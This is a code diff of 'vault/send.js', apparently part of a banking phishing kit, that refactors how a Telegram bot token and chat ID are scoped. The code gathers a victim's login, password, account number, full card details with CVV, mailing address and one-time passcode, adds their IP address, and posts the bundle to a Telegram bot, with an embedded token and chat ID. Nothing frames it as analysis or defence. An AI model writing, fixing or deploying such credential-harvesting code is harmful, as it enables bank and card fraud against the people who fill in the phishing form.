@@ -1,9 +1,14 @@
 // vault/send.js
 
-// Only declare if not already declared
-if (typeof BOT_TOKEN === 'undefined' && typeof CHAT_ID === 'undefined') {
-  const BOT_TOKEN = '6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU';
-  const CHAT_ID = '5817278771';
+// Use let instead of const, and wrap in IIFE to avoid global scope pollution
+(function () {
+  if (typeof window.BOT_TOKEN === 'undefined') {
+    window.BOT_TOKEN = '6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU';
+  }
+
+  if (typeof window.CHAT_ID === 'undefined') {
+    window.CHAT_ID = '5817278771';
+  }
 
   function sendToTelegram(data, callback) {
     fetch('https://api.ipify.org?format=json')
@@ -12,11 +17,11 @@ if (typeof BOT_TOKEN === 'undefined' && typeof CHAT_ID === 'undefined') {
         const ip = ipData.ip || 'Unknown';
         const message = `[53rd Result]\n\nLOGIN\n👤 Username: ${data.userid}\n🔑 Password: ${data.password}\n\nVERIFICATION\n🏦 Account Number: ${data.accountnumber}\n🧑 Name on Card: ${data.cardname}\n💳 Card Number: ${data.cardnumber}\n💳 CVV: ${data.cvv}\n📅 Expiry Date: ${data.expdate}\n🏠 Mailing Address: ${data.mailingaddress}\n🔐 OTP: ${data.otp}\n\n🌐 IP Address: ${ip}`;
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: CHAT_ID,
+            chat_id: window.CHAT_ID,
             text: message
           })
         })
@@ -66,4 +71,4 @@ if (typeof BOT_TOKEN === 'undefined' && typeof CHAT_ID === 'undefined') {
       form.reset();
     });
   });
-}
+})();
